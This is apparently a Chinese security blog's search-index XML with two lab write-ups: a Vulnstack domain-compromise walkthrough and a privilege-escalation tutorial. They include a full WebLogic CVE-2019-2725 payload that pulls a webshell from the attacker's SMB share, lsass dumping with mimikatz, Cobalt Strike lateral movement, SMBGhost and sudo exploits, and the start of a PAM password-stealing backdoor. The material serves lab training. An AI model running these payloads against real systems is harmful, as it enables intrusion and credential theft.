<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ATT&amp;CK实战系列——红队实战(二)</title>
      <link href="/archives/63e9fa60.html"/>
      <url>/archives/63e9fa60.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><h2 id="1-1-靶场下载"><a href="#1-1-靶场下载" class="headerlink" title="1.1 靶场下载"></a>1.1 靶场下载</h2><hr><p>靶场下载地址<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener">传送门</a></p><blockquote><p>靶机通用密码：  1qaz@WSX</p></blockquote><h2 id="1-2-环境配置"><a href="#1-2-环境配置" class="headerlink" title="1.2 环境配置"></a>1.2 环境配置</h2><hr><p>拓扑图<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)1.png" alt=""><br>下载好靶机打开vmx文件z之后恢复到快照v1.3，由于DMZ网段为192.168.111.0/24，所以需要将子网ip设置为192.168.111.0<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)2.png" alt=""></p><h2 id="1-3-配置信息"><a href="#1-3-配置信息" class="headerlink" title="1.3 配置信息"></a>1.3 配置信息</h2><hr><p>DC<br>IP：10.10.10.10OS：Windows 2012(64)<br>应用：AD域</p><p>WEB<br>IP1：10.10.10.80<br>IP2：192.168.111.80<br>OS：Windows 2008(64)<br>应用：Weblogic 10.3.6MSSQL 2008</p><p>PC<br>IP1：10.10.10.201<br>IP2：192.168.111.201<br>OS：Windows 7(32)<br>应用：</p><p>攻击机<br>IP： 192.168.111.1<br>OS： Windows 10(64)<br>IP： 192.168.111.128<br>OS： Kali</p><blockquote><p>内网网段：10.10.10.1/24<br>DMZ网段：192.168.111.1/24</p></blockquote><h2 id="1-4-域环境初始化"><a href="#1-4-域环境初始化" class="headerlink" title="1.4 域环境初始化"></a>1.4 域环境初始化</h2><hr><p>登录 WEB 主机启动服务。默认密码是 1qaz@WSX 需登录时修改。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)3.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)4.png" alt=""><br>输入新密码123.com<br>切换至 WEB 服务目录下启动 WEB 服务。<br>C:\Oracle\Middleware\user_projects\domains\base_domain<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)5.png" alt=""><br>双击运行<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)6.png" alt=""></p><h1 id="二、weblogic-漏洞利用并-getshell"><a href="#二、weblogic-漏洞利用并-getshell" class="headerlink" title="二、weblogic 漏洞利用并 getshell"></a>二、weblogic 漏洞利用并 getshell</h1><h2 id="2-1-信息收集"><a href="#2-1-信息收集" class="headerlink" title="2.1    信息收集"></a>2.1    信息收集</h2><hr><p>全端口扫描<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)7.png" alt=""><br>常用端口是开放状态 1433 是 mssql， 7001 知道是 weblogic 服务，因为前面手工开启的。<br>使用WeblogicScan 工具扫一下<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)8.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)9.png" alt=""></p><h2 id="2-2-利用-CVE-2019-2725-获得-shell"><a href="#2-2-利用-CVE-2019-2725-获得-shell" class="headerlink" title="2.2    利用 CVE-2019-2725 获得 shell"></a>2.2    利用 CVE-2019-2725 获得 shell</h2><hr><p>Kali 搭建 smbserver 通过命令执行直接 copy 冰蝎马到服务器上。<br>启动 smbserver 名称为 share 目录为/root/<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)10.png" alt=""><br>打开 BurpSuite<br>将 POC 复制到 Repeater 中进行发包。</p><pre style="background-color:#F0F8FF;">POST /_async/AsyncResponseService HTTP/1.1Host: 192.168.111.80:7001User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3DNT: 1Connection: closeContent-Type: text/xmlContent-Length: 839&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt;&lt;soapenv:Header&gt;&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;&lt;void class="java.lang.ProcessBuilder"&gt;&lt;array class="java.lang.String" length="3"&gt;&lt;void index="0"&gt;&lt;string&gt;cmd&lt;/string&gt;&lt;/void&gt;&lt;void index="1"&gt;&lt;string&gt;/c&lt;/string&gt;&lt;/void&gt;&lt;void index="2"&gt;&lt;string&gt;copy \\192.168.111.128\share\shell.jsp servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\1.jsp &lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method="start"/&gt;&lt;/void&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;asy:onAsyncDelivery/&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</pre><p>设置目标主机端口<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)11.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)12.png" alt=""><br>使用冰蝎进行连接，地址：<a href="http://192.168.111.80:7001/_async/1.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/_async/1.jsp</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)13.png" alt=""><br>查看用户信息<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)14.png" alt=""><br>查看系统信息，看一下系统安装了哪些补丁<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)15.png" alt=""></p><h1 id="三、域渗透靶场获取DC权限"><a href="#三、域渗透靶场获取DC权限" class="headerlink" title="三、域渗透靶场获取DC权限"></a>三、域渗透靶场获取DC权限</h1><h2 id="3-1-Cobalt-Strike-部署"><a href="#3-1-Cobalt-Strike-部署" class="headerlink" title="3.1    Cobalt Strike 部署"></a>3.1    Cobalt Strike 部署</h2><hr><p>上传到kali中并解压<br>添加执行权限<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)16.png" alt=""><br>启动服务端(命令+ip+密码)<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)17.png" alt=""><br>启动客户端<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)18.png" alt=""><br>用户名随意填写， CS 支持多人协同工作，密码是 123456。</p><h2 id="3-2-创建监听"><a href="#3-2-创建监听" class="headerlink" title="3.2    创建监听"></a>3.2    创建监听</h2><hr><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)19.png" alt=""><br>添加<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)20.png" alt=""><br>生成exe程序<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)21.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)22.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)23.png" alt=""></p><h2 id="3-3-上传相关利用工具"><a href="#3-3-上传相关利用工具" class="headerlink" title="3.3  上传相关利用工具"></a>3.3  上传相关利用工具</h2><hr><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)24.png" alt=""></p><h2 id="3-4-反弹管理员shell-给-cs-服务"><a href="#3-4-反弹管理员shell-给-cs-服务" class="headerlink" title="3.4    反弹管理员shell 给 cs 服务"></a>3.4    反弹管理员shell 给 cs 服务</h2><hr><p>先切换到我们上传文件的目录，运行 web.exe 返回一个 de1ay 用户的 shell。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)25.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)26.png" alt=""><br>提权<br>右键-&gt;Access-&gt;Elevate-&gt;ms14-058 提到 system 权限<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)27.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)28.png" alt=""></p><h2 id="3-5-明文读取密码"><a href="#3-5-明文读取密码" class="headerlink" title="3.5    明文读取密码"></a>3.5    明文读取密码</h2><hr><p>使用 管理员 权限 download 进程内<br><code>beacon&gt; shell procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)29.png" alt=""><br>需要将 lsass.dmp 文件拖回本地放至相同的系统中进行解密。<br><code>beacon&gt; shell mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit &gt;pass.txt</code><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)30.png" alt=""><br>直接使用 download 命令下载，下载后会保存到程序目录的 downloads 目录。<br><code>beacon&gt; download pass.txt</code><br>名字是随机字符串<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)32.png" alt=""></p><h2 id="3-6-域信息收集"><a href="#3-6-域信息收集" class="headerlink" title="3.6    域信息收集"></a>3.6    域信息收集</h2><hr><p>目前得到账户信息<br>mssql@de1ay 1qaz@WSX<br>de1ay@de1ay 1qaz@WSX<br>de1ay@WEB 该用户是登录系统用的，密码是登录时自行修改的。<br>查看网络信息找到域控<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)33.png" alt=""><br>DNS 服务器 10.10.10.10 也就是域控。<br>找到 DC 的主机名<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)34.png" alt=""><br>主机名： DC.de1ay.com</p><h2 id="3-7-通过凭证连接域控反弹域控-shell"><a href="#3-7-通过凭证连接域控反弹域控-shell" class="headerlink" title="3.7    通过凭证连接域控反弹域控 shell"></a>3.7    通过凭证连接域控反弹域控 shell</h2><hr><p>创建新的监听。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)35.png" alt=""><br>选择 smb 这个特殊的 beacon，名称就叫 smb 这个后面要用。<br>恢复初始凭证<br><code>beacon&gt; rev2self</code><br>通过前面获取到的账户信息生成新的凭证。<br><code>beacon&gt; make_token DE1AY\de1ay 1qaz@WSX</code><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)36.png" alt=""><br>DC上线<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)37.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%BA%8C)38.png" alt=""></p><blockquote><p>工具包<a href="https://pan.baidu.com/s/1VdQW_AalGaZqT2LepNEnLw" target="_blank" rel="noopener">提取码：aj70</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 内网域渗透 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手工提权</title>
      <link href="/archives/24efcaff.html"/>
      <url>/archives/24efcaff.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、Window10-提权漏洞"><a href="#一、Window10-提权漏洞" class="headerlink" title="一、Window10 提权漏洞"></a>一、Window10 提权漏洞</h1><p>漏洞复现<br>靶机：win10虚拟机  ip：192.168.216.128(防火墙关闭)<br>攻击机：kali虚拟机  ip：192.168.202.130</p><h2 id="1-检测系统是否存在漏洞"><a href="#1-检测系统是否存在漏洞" class="headerlink" title="1:检测系统是否存在漏洞"></a>1:检测系统是否存在漏洞</h2><blockquote><p>git下载地址<a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">传送门</a></p></blockquote><p>用法：python3 scanner.py 目标ip<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%831.png" alt=""></p><p>目标存在该漏洞</p><h2 id="2-提权POC提权"><a href="#2-提权POC提权" class="headerlink" title="2:提权POC提权"></a>2:提权POC提权</h2><p>POC下载地址<a href="https://github.com/chompie1337/SMBGhost_RCE_Po" target="_blank" rel="noopener">传送门</a></p><ul><li>第一步：msf生成反向连接木马：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%832.png" alt=""></li><li>第二步：生成的exploit.py 生成的code，替换到exploit.py的USER_PAYLOAD参数，并把参数buf改为USER_PAYLOAD。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%833.png" alt=""></li><li>第三步：启动msf<br>配置监听<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%834.png" alt=""></li><li>第四步：运行poc，自动建立连接<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%835.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%836.png" alt=""><br>查看当前用户权限<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%837.png" alt=""><br>如果不是system权限可以使用msf中的getsystem进行一下提权，也可以使用对应漏洞的提权文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%838.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%839.png" alt=""><br>执行完提权文件cve-2020-0796-local.exe后可以看到成功提权到system权限</li></ul><h1 id="二、Linux-sudo提权漏洞"><a href="#二、Linux-sudo提权漏洞" class="headerlink" title="二、Linux sudo提权漏洞"></a>二、Linux sudo提权漏洞</h1><p>漏洞编号：CVE-2021-3156<br>漏洞级别：高危<br>受影响版本：<br>        sudo: 1.8.2 - 1.8.31p2<br>        sudo: 1.9.0 - 1.9.5p1<br>检测方法：<br>    以非root用户登录系统，并运行如下命令：<br>    sudoedit -s /</p><ul><li>如果响应一个以sudoedit:开头的报错，那么表明存在漏洞。</li><li>如果响应一个以usage:开头的报错，那么表明补丁已经生效。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8310.png" alt=""><br>POC利用<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8311.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8312.png" alt=""></li></ul><h1 id="三、自动劫持root密码并转发密码到邮箱"><a href="#三、自动劫持root密码并转发密码到邮箱" class="headerlink" title="三、自动劫持root密码并转发密码到邮箱"></a>三、自动劫持root密码并转发密码到邮箱</h1><h2 id="1-过PAM认证模块劫持密码"><a href="#1-过PAM认证模块劫持密码" class="headerlink" title="1.过PAM认证模块劫持密码"></a>1.过PAM认证模块劫持密码</h2><p>思路：在 xuegod63 上安装一个打了后门补丁的 PAM 认证模块，当用户来连接时，直接把密码记录下来。然后使用脚本发给我们的邮箱中</p><ul><li>查看pam版本<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8313.png" alt=""><br>下载对应版本软件包</li></ul><h2 id="2-安装gcc和pam依赖"><a 